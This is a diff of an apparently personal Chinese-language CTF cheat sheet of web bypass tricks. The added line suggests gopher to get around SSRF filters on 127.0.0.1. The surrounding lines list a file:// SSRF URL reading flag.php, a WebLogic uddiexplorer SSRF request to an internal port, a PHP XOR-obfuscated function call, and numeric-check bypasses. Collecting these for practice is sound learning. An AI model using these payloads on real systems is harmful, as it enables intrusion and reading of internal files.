@@ -23,6 +23,7 @@ int比较：科学计数法绕过(1.1e1)
 数字相等对比：转为16进制前加0x，不适用is_numeric（？）
 is_numeric绕过：多个回车
 SSRF，url链接访问获得文件内容：?url=file://localhost/var/www/html/flag.php
+SSRF遇到限制127.0.0.1内网访问的可以用gopher绕过
 伪造请求访问404页面：/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
 异或：${"!"^"~"}="z"^"G";${"!"^"~"}();
 preg_match：正则匹配
